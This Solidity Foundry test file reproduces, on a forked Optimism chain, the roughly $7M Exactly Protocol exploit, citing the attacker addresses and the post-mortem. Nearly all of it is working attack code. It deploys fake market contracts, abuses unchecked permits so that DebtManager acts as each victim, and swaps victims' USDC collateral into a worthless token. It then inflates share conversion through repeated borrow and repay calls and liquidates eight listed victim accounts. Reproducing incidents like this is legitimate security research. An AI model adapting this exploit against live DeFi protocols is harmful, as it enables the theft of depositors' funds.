// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$7M USD$
// Attacker : https://optimistic.etherscan.io/address/0x3747dbbcb5c07786a4c59883e473a2e38f571af9
// Attack Contract : https://optimistic.etherscan.io/address/0x6dd61c69415c8ecab3fefd80d079435ead1a5b4d
// Vulnerable Contract : https://optimistic.etherscan.io/address/0x16748cb753a68329ca2117a7647aa590317ebf41
// Attack Tx : https://optimistic.etherscan.io/tx/0x3d6367de5c191204b44b8a5cf975f257472087a9aadc59b5d744ffdef33a520e

// @Info
// Vulnerable Contract Code : https://optimistic.etherscan.io/address/0x16748cb753a68329ca2117a7647aa590317ebf41#code

// @Analysis
// Post-mortem : https://medium.com/@exactly_protocol/exactly-protocol-incident-post-mortem-b4293d97e3ed
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1692533280971936059

interface IexaUSDC is IERC4626 {
    function asset() external returns (address);
    function auditor() external view returns (address);
    function borrowAtMaturity(
        uint256 maturity,
        uint256 assets,
        uint256 maxAssets,
        address receiver,
        address borrower
    ) external returns (uint256 assetsOwed);
    function repayAtMaturity(
        uint256 maturity,
        uint256 positionAssets,
        uint256 maxAssets,
        address borrower
    ) external returns (uint256 actualRepayAssets);
    function liquidate(
        address borrower,
        uint256 maxAssets,
        address seizeMarket
    ) external returns (uint256 repaidAssets);
}

interface IAuditor {
    struct MarketData {
        uint128 adjustFactor;
        uint8 decimals;
        uint8 index;
        bool isListed;
        address priceFeed;
    }

    function accountLiquidity(
        address account,
        address marketToSimulate,
        uint256 withdrawAmount
    ) external view returns (uint256 sumCollateral, uint256 sumDebtPlusEffects);
    function markets(address market) external view returns (MarketData memory);
    function assetPrice(address priceFeed) external view returns (uint256);
}

interface IDebtManager {
    struct Permit {
        address account;
        uint256 deadline;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function leverage(
        address market,
        uint256 deposit,
        uint256 ratio,
        uint256 borrowAssets,
        Permit calldata marketPermit
    ) external;
    function crossDeleverage(
        address marketIn,
        address marketOut,
        uint24 fee,
        uint256 withdraw,
        uint256 ratio,
        uint160 sqrtPriceLimitX96
    ) external;
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IexaUSDC exaUSDC = IexaUSDC(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);
    INonfungiblePositionManager UNIV3NFTManager =
        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IDebtManager DebtManager = IDebtManager(0x675d410dcf6f343219AAe8d1DDE0BFAB46f52106);
    IQuoter Quoter = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);
    IAuditor Auditor = IAuditor(0xaEb62e6F27BC103702E7BC879AE98bceA56f027E);
    address USDCPirceFeed = 0x16a9FA2FDa030272Ce99B29CF780dFA30361E0f3;
    FakeMarket fakeMarket;
    FakeMarket[] fakeMarketList;
    address[] victimList = [
        0xF35e261393F9705e10B378C6785582B2a5A71094,
        0x87bF260aef0Efd0AB046417ba290f69aE24C1642,
        0x3cf3c6a96357e26DE5c6F8Be745DC453AAD59249,
        0x551Cfb91aCd97572BA1C2B177EEB667c207CE759,
        0x2f0D2701b620B639e44E1824446a0d63D7a05C31,
        0x8789E0a45b270d7fd9aeD1a72682f6530a722c50,
        0xd1aDb83CD6390c6bBd619Fdd79fC37F9f58f1a4C,
        0x055a0495104AeA25551E7A58eBA88DC56709E871
    ];
    uint256[] maturityList = [
        1_693_440_000,
        1_693_440_000 + 4 weeks,
        1_693_440_000 + 8 weeks,
        1_693_440_000 + 12 weeks,
        1_693_440_000 + 16 weeks,
        1_693_440_000 + 20 weeks
    ];

    function setUp() public {
        vm.createSelectFork("optimism", 108_375_557);
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(exaUSDC), "exaUSDC");
        vm.label(address(UNIV3NFTManager), "UNIV3NFTManager");
        vm.label(address(DebtManager), "DebtManager");
        vm.label(address(Auditor), "Auditor");
        vm.label(address(USDCPirceFeed), "USDCPirceFeed");
        vm.label(address(exaUSDC), "exaUSDC");
        vm.label(address(Quoter), "Quoter");
    }

    // https://solidity-by-example.org/app/minimal-proxy/
    function Clone(address target) public returns (address result) {
        bytes20 targetBytes = bytes20(target);
        assembly {
            let clone := mload(0x40)
            mstore(clone, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)
            mstore(add(clone, 0x14), targetBytes)
            mstore(add(clone, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)
            result := create(0, clone, 0x37)
        }
    }

    function testExploit() external {
        fakeMarket = new FakeMarket();
        for (uint256 i; i < 16; ++i) {
            address miniProxy = Clone(address(fakeMarket)); // create fake market
            fakeMarketList.push(FakeMarket(miniProxy));
            FakeMarket(miniProxy).init(
                address(UNIV3NFTManager),
                address(Auditor),
                address(DebtManager),
                address(exaUSDC),
                address(Quoter),
                address(USDC),
                address(USDCPirceFeed),
                1_000_000
            );
        }

        USDC.approve(address(exaUSDC), type(uint256).max);

        for (uint256 i; i < 8; ++i) {
            fakeMarketList[i].setVictim(victimList[i]);
            // @note https://github.com/exactly/protocol/blob/main/contracts/periphery/DebtManager.sol#L762-L792
            DebtManager.leverage(
                address(fakeMarketList[i]),
                0,
                0,
                0,
                IDebtManager.Permit({account: address(victimList[i]), deadline: 0, v: 0, r: bytes32(0), s: bytes32(0)})
            ); // set global variable _msgSender to victimList[i] in contract DebtManager, then invoke fakeMarketList[i].deposit() to trigger the function crossDelevage()
        }

        // swap victim's USDC to fakeToken in function fakeMarkt.deposit(), victim's collateral value is close to the value of the loan and is on the verge of liquidation

        // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L783-L785
        // victim CollateralAmount = convertToAssets(balanceOf[account]), attacker manipulating the ratio reduction in convertToAssets,
        // causing the victim's collateral value to be less than the value of the loan

        // *********************** convertToAssets Manipulation *********************** //
        emit log_named_decimal_uint(
            "befoe manipulation, 1 ether exaUSDC share convert to assets is : ",
            exaUSDC.convertToAssets(1 ether),
            USDC.decimals()
        );
        emit log_named_decimal_uint(
            "befoe manipulation, victim's exaUSDC share convert to assets is : ",
            exaUSDC.convertToAssets(exaUSDC.balanceOf(victimList[0])),
            USDC.decimals()
        );

        uint256 depositAmount = USDC.balanceOf(address(this)) * 9 / 10;
        uint256 share = exaUSDC.deposit(depositAmount, address(this)); // deposit USDC to exaUSDC contract

        for (uint256 i; i < 6; ++i) {
            (uint256 sumCollateral, uint256 sumDebtPlusEffects) =
                Auditor.accountLiquidity(address(victimList[0]), address(0), 0);
            // In the attack transaction, only the top victim is checked to see if they meet the liquidation conditions.
            // By removing this check, more users can be made eligible for liquidation.
            // if (sumCollateral >= sumDebtPlusEffects) {
            // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L917-L942
            // the backupEarnings decrease
            // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L930-L932
            exaUSDC.borrowAtMaturity(
                maturityList[i], depositAmount / 2, type(uint256).max, address(this), address(this)
            );
            exaUSDC.repayAtMaturity(maturityList[i], type(uint256).max, type(uint256).max, address(this));
            // } else {
            //     break;
            // }
        }

        exaUSDC.redeem(share, address(this), address(this)); // withdraw all exaUSDC share

        emit log_named_decimal_uint(
            "after manipulation, 1 ether exaUSDC share convert to assets is : ",
            exaUSDC.convertToAssets(1 ether),
            USDC.decimals()
        );
        emit log_named_decimal_uint(
            "after manipulation, victim's exaUSDC share convert to assets is : ",
            exaUSDC.convertToAssets(exaUSDC.balanceOf(victimList[0])),
            USDC.decimals()
        );

        // *********************** liquidate *********************** //
        for (uint256 i; i < 8; ++i) {
            try exaUSDC.liquidate(victimList[i], type(uint256).max, address(exaUSDC)) {}
            catch {
                continue;
            } // liquidate victim's position
            fakeMarketList[i + 8].setVictim(victimList[i]);
            try DebtManager.leverage( // Manipulate the victim's position further after liquidation
                address(fakeMarketList[i + 8]),
                0,
                0,
                0,
                IDebtManager.Permit({account: address(victimList[i]), deadline: 0, v: 0, r: bytes32(0), s: bytes32(0)})
            ) {} catch {
                continue;
            } // set global _msgSender to victimList[i] in contract DebtManager, then invoke fakeMarketList[i].deposit() to trigger the function crossDelevage()
        }

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }
}

contract FakeMarket is Nonces {
    using FixedPointMathLib for int256;
    using FixedPointMathLib for uint256;
    using FixedPointMathLib for uint128;

    INonfungiblePositionManager UNIV3NFTManager =
        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IAuditor Auditor = IAuditor(0xaEb62e6F27BC103702E7BC879AE98bceA56f027E);
    IDebtManager DebtManager = IDebtManager(0x675d410dcf6f343219AAe8d1DDE0BFAB46f52106);
    IexaUSDC exaUSDC = IexaUSDC(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);
    IQuoter Quoter = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    address USDCPirceFeed = 0x16a9FA2FDa030272Ce99B29CF780dFA30361E0f3;
    address victim;
    uint256 baseUnit = 1_000_000;
    uint256 fakeTokenAmount;
    address public asset;
    address Owner;

    function init(address a, address b, address c, address d, address e, address f, address g, uint256 base) external {
        UNIV3NFTManager = INonfungiblePositionManager(a);
        Auditor = IAuditor(b);
        DebtManager = IDebtManager(c);
        exaUSDC = IexaUSDC(d);
        Quoter = IQuoter(e);
        USDC = IERC20(f);
        USDCPirceFeed = g;
        asset = address(this);
        baseUnit = base;
        balanceOf[address(this)] += 1_000_000_000_000 ether;
        Owner = msg.sender;
        if (address(this) < address(USDC)) {
            UNIV3NFTManager.createAndInitializePoolIfNecessary(
                address(this), address(USDC), 500, 79_228_162_514_264_337_593_543_950_336
            ); // create faketoken-USDC Uni-V3 pool
        } else {
            UNIV3NFTManager.createAndInitializePoolIfNecessary(
                address(USDC), address(this), 500, 79_228_162_514_264_337_593_543_950_336
            ); // create faketoken-USDC Uni-V3 pool
        }
    }

    function setVictim(address v) external {
        // setV
        victim = v;
    }

    // ******************** Market ******************** //

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        // @note https://github.com/exactly/protocol/blob/main/contracts/Auditor.sol#L107-L148
        (uint256 sumCollateral, uint256 sumDebtPlusEffects) = Auditor.accountLiquidity(address(victim), address(0), 0);
        uint256 availableCollateralValue = sumCollateral - sumDebtPlusEffects; // availableCollateralValue = sumCollateral - sumDebtPlusEffects
        IAuditor.MarketData memory marketData = Auditor.markets(address(exaUSDC));
        uint128 Factor = marketData.adjustFactor;
        uint256 USDCPirce = Auditor.assetPrice(USDCPirceFeed);

        uint256 availableCollateralAmount = (availableCollateralValue.divWadUp(Factor)).mulDivUp(baseUnit, USDCPirce); // availableCollateralAmount = (availableCollateralValue / Factor) * baseUnit / USDCPirce
        availableCollateralAmount = availableCollateralAmount - 2; // availableCollateralAmount = availableCollateralAmount - 2

        if (
            exaUSDC.convertToAssets(exaUSDC.allowance(address(victim), address(DebtManager)))
                < availableCollateralAmount
        ) {
            // if(exaUSDC.convertToAssets(exaUSDC.balanceOf(address(this))) < availableCollateralAmount)
            availableCollateralAmount =
                exaUSDC.convertToAssets(exaUSDC.allowance(address(victim), address(DebtManager))); // availableCollateralAmount = exaUSDC.convertToAssets(exaUSDC.Allowance(address(this), DebtManager))
        }
        if (exaUSDC.convertToAssets(exaUSDC.balanceOf(address(victim))) < availableCollateralAmount) {
            // if(exaUSDC.convertToAssets(exaUSDC.balanceOf(address(this))) < availableCollateralAmount)
            availableCollateralAmount = exaUSDC.convertToAssets(exaUSDC.balanceOf(address(this))); // availableCollateralAmount = exaUSDC.convertToAssets(exaUSDC.balanceOf(address(this)))
        }

        uint256 USDCAmountIn = availableCollateralAmount;

        IERC20(address(this)).approve(address(DebtManager), type(uint256).max);
        IERC20(address(this)).approve(address(UNIV3NFTManager), type(uint256).max);
        address Token0 = address(this);
        address Token1 = address(USDC);
        uint256 amount0 = 1_000_000 ether;
        uint256 amount1 = 0;
        int24 lower = 0;
        int24 upper = 10;
        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;
        if (address(this) > address(USDC)) {
            Token0 = address(USDC);
            Token1 = address(this);
            amount0 = 0;
            amount1 = 1_000_000 ether;
            lower = -10;
            upper = 0;
            sqrtPriceLimitX96 = 4_295_128_740;
        }
        (uint256 tokenId, uint128 liquidity,,) = UNIV3NFTManager.mint(
            INonfungiblePositionManager.MintParams({ // add liquidity to faketoken-USDC Uni-V3 pool
                token0: Token0,
                token1: Token1,
                fee: 500,
                tickLower: lower,
                tickUpper: upper,
                amount0Desired: amount0,
                amount1Desired: amount1,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );

        fakeTokenAmount =
            Quoter.quoteExactInputSingle(address(USDC), address(this), 500, USDCAmountIn, sqrtPriceLimitX96);

        // @note now the _msgSender is victim, so attacker can manipulation the position of victim
        DebtManager.crossDeleverage(address(exaUSDC), address(this), 500, 0, 0, sqrtPriceLimitX96); // swap USDC to fakeToken in Uni-V3 pool

        UNIV3NFTManager.decreaseLiquidity(
            INonfungiblePositionManager.DecreaseLiquidityParams({ // remove liquidity from faketoken-USDC Uni-V3 pool
                tokenId: tokenId,
                liquidity: liquidity,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        UNIV3NFTManager.collect(
            INonfungiblePositionManager.CollectParams({ // collect fakeToken/USDC from faketoken-USDC Uni-V3 pool
                tokenId: tokenId,
                recipient: address(Owner),
                amount0Max: 340_282_366_920_938_463_463_374_607_431_768_211_455,
                amount1Max: 340_282_366_920_938_463_463_374_607_431_768_211_455
            })
        );
    }

    struct Account {
        uint256 fixedDeposits;
        uint256 fixedBorrows;
        uint256 floatingBorrowShares;
    }

    function previewRefund(uint256 shares) public view returns (uint256) {
        return fakeTokenAmount;
    }

    function accounts(address owner) external view returns (Account memory) {
        return Account(0, 0, 0);
    }

    function repay(uint256 assets, address borrower) external returns (uint256 actualRepay, uint256 borrowShares) {}

    // ******************** ERC4626 ******************** //

    function maxWithdraw(address owner) external view returns (uint256) {
        return 0;
    }

    // ******************** ERC20Permit ******************** //
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "fake market";
    string public symbol = "fm";
    uint8 public decimals = 18;

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        _useNonce(owner);
    }

    function nonces(address owner) public view virtual override(Nonces) returns (uint256) {
        return super.nonces(owner);
    }
}
